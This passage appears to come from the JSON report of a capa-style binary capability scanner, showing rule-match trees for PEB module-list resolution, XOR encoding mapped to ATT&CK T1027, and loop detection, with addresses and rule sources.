                                "statement": {
                                  "type": "and"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "arch",
                                      "arch": "i386"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "characteristic",
                                      "characteristic": "fs access"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "or"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "offset",
                                          "offset": 48
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "match",
                                          "match": "PEB access/bf91a73f78d8403b8c253a33b4b273a8"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "and"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "arch",
                                      "arch": "amd64"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "no address"
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "characteristic",
                                      "characteristic": "gs access"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 6442466145
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "or"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "offset",
                                          "offset": 96
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "absolute",
                                          "value": 6442466154
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "match",
                                          "match": "PEB access/c9144047927f432396a43839121c8b32"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442466123
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "offset",
                          "offset": 12,
                          "description": "PEB.LDR_DATA"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or",
                          "description": "resolve a module list"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 12,
                              "description": "PEB.LDR_DATA.InLoadOrderModuleList"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 20,
                              "description": "PEB.LDR_DATA.InMemoryOrderModuleList"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 28,
                              "description": "PEB.LDR_DATA.InInitializationOrderModuleList"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and",
                      "description": "x64"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "arch",
                          "arch": "amd64"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "PEB access"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "characteristic",
                                  "characteristic": "peb access"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "and"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "characteristic",
                                      "characteristic": "fs access"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "match",
                                      "match": "PEB access/9d7880435c974efead46712e388ff364"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "and"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "arch",
                                      "arch": "i386"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "characteristic",
                                      "characteristic": "fs access"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "or"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "offset",
                                          "offset": 48
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "match",
                                          "match": "PEB access/bf91a73f78d8403b8c253a33b4b273a8"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "and"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "arch",
                                      "arch": "amd64"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "no address"
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "characteristic",
                                      "characteristic": "gs access"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 6442466145
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "or"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "offset",
                                          "offset": 96
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "absolute",
                                          "value": 6442466154
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "match",
                                          "match": "PEB access/c9144047927f432396a43839121c8b32"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442466123
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "offset",
                          "offset": 24,
                          "description": "PEB.LDR_DATA"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442466168
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or",
                          "description": "resolve a module list"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 16,
                              "description": "PEB.LDR_DATA.InLoadOrderModuleList"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 32,
                              "description": "PEB.LDR_DATA.InMemoryOrderModuleList"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442466182
                            },
                            {
                              "type": "absolute",
                              "value": 6442466175
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 48,
                              "description": "PEB.LDR_DATA.InInitializationOrderModuleList"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "encode data using XOR": {
        "meta": {
          "name": "encode data using XOR",
          "namespace": "data-manipulation/encoding/xor",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "basic block"
          },
          "attack": [
            {
              "parts": [
                "Defense Evasion",
                "Obfuscated Files or Information"
              ],
              "tactic": "Defense Evasion",
              "technique": "Obfuscated Files or Information",
              "subtechnique": "",
              "id": "T1027"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Defense Evasion",
                "Obfuscated Files or Information",
                "Encoding-Standard Algorithm"
              ],
              "objective": "Defense Evasion",
              "behavior": "Obfuscated Files or Information",
              "method": "Encoding-Standard Algorithm",
              "id": "E1027.m02"
            },
            {
              "parts": [
                "Data",
                "Encode Data",
                "XOR"
              ],
              "objective": "Data",
              "behavior": "Encode Data",
              "method": "XOR",
              "id": "C0026.002"
            }
          ],
          "references": [],
          "examples": [
            "2D3EDC218A90F03089CC01715A9F047F:0x403D7E"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: encode data using XOR\r\n    namespace: data-manipulation/encoding/xor\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: basic block\r\n      dynamic: unsupported  # requires characteristic, Not features\r\n    att&ck:\r\n      - Defense Evasion::Obfuscated Files or Information [T1027]\r\n    mbc:\r\n      - Defense Evasion::Obfuscated Files or Information::Encoding-Standard Algorithm [E1027.m02]\r\n      - Data::Encode Data::XOR [C0026.002]\r\n    examples:\r\n      - 2D3EDC218A90F03089CC01715A9F047F:0x403D7E\r\n  features:\r\n    - and:\r\n      - characteristic: tight loop\r\n      - characteristic: nzxor\r\n      - not:\r\n        - description: filter for potential false positives\r\n        - or:\r\n          - or:\r\n            - description: unsigned bitwise negation operation (~i)\r\n            - number: 0xFFFFFFFF = bitwise negation for unsigned 32 bits\r\n            - number: 0xFFFFFFFFFFFFFFFF = bitwise negation for unsigned 64 bits\r\n          - or:\r\n            - description: signed bitwise negation operation (~i)\r\n            - number: 0x0FFFFFFF = bitwise negation for signed 32 bits\r\n            - number: 0x0FFFFFFFFFFFFFFF = bitwise negation for signed 64 bits\r\n          - or:\r\n            - description: Magic constants used in the implementation of strings functions.\r\n            # such as `strlen` and `strcat` in the Windows standard library:\r\n            # (((i - 0x81010101) ^ ~i) & 0x81010100)\r\n            ## 32 bits\r\n            - number: 0x7EFEFEFF = optimized string constant for 32 bits\r\n            - number: 0x81010101 = -0x81010101 = 0x7EFEFEFF\r\n            - number: 0x81010100 = 0x81010100 = ~0x7EFEFEFF\r\n            ## 64 bits\r\n            - number: 0x7EFEFEFEFEFEFEFF = optimized string constant for 64 bits\r\n            - number: 0x8101010101010101 = -0x8101010101010101 = 0x7EFEFEFEFEFEFEFF\r\n            - number: 0x8101010101010100 = 0x8101010101010100 = ~0x7EFEFEFEFEFEFEFF\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442467981
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442467981
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "nzxor"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442468034
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "not",
                      "description": "filter for potential false positives"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or",
                              "description": "unsigned bitwise negation operation (~i)"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 4294967295,
                                  "description": "bitwise negation for unsigned 32 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 18446744073709551615,
                                  "description": "bitwise negation for unsigned 64 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or",
                              "description": "signed bitwise negation operation (~i)"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 268435455,
                                  "description": "bitwise negation for signed 32 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 1152921504606846975,
                                  "description": "bitwise negation for signed 64 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or",
                              "description": "Magic constants used in the implementation of strings functions."
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 2130640639,
                                  "description": "optimized string constant for 32 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 2164326657,
                                  "description": "-0x81010101 = 0x7EFEFEFF"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 2164326656,
                                  "description": "0x81010100 = ~0x7EFEFEFF"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 9151031864016699135,
                                  "description": "optimized string constant for 64 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 9295712209692852481,
                                  "description": "-0x8101010101010101 = 0x7EFEFEFEFEFEFEFF"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 9295712209692852480,
                                  "description": "0x8101010101010100 = ~0x7EFEFEFEFEFEFEFF"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442468298
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442468298
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "nzxor"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442468387
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "not",
                      "description": "filter for potential false positives"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or",
                              "description": "unsigned bitwise negation operation (~i)"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 4294967295,
                                  "description": "bitwise negation for unsigned 32 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 18446744073709551615,
                                  "description": "bitwise negation for unsigned 64 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or",
                              "description": "signed bitwise negation operation (~i)"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 268435455,
                                  "description": "bitwise negation for signed 32 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 1152921504606846975,
                                  "description": "bitwise negation for signed 64 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or",
                              "description": "Magic constants used in the implementation of strings functions."
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 2130640639,
                                  "description": "optimized string constant for 32 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 2164326657,
                                  "description": "-0x81010101 = 0x7EFEFEFF"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 2164326656,
                                  "description": "0x81010100 = ~0x7EFEFEFF"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 9151031864016699135,
                                  "description": "optimized string constant for 64 bits"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 9295712209692852481,
                                  "description": "-0x8101010101010101 = 0x7EFEFEFEFEFEFEFF"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 9295712209692852480,
                                  "description": "0x8101010101010100 = ~0x7EFEFEFEFEFEFEFF"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "contain loop": {
        "meta": {
          "name": "contain loop",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "function"
          },
          "attack": [],
          "mbc": [],
          "references": [],
          "examples": [
            "08AC667C65D36D6542917655571E61C8:0x406EAA"
          ],
          "description": "",
          "lib": true,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: contain loop\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    lib: true\r\n    scopes:\r\n      static: function\r\n      dynamic: unsupported  # requires characteristic features\r\n    examples:\r\n      - 08AC667C65D36D6542917655571E61C8:0x406EAA\r\n  features:\r\n    - or:\r\n      - characteristic: loop\r\n      - characteristic: tight loop\r\n      - characteristic: recursive call\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442455134
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442455139
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442455171
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442455171
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442455819
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442455819
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442457666
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442457666
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442464629
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442464780
                    },
                    {
                      "type": "absolute",
                      "value": 6442464735
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442465122
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442465122
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442465298
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442465298
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442465405
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442465405
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442465550
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
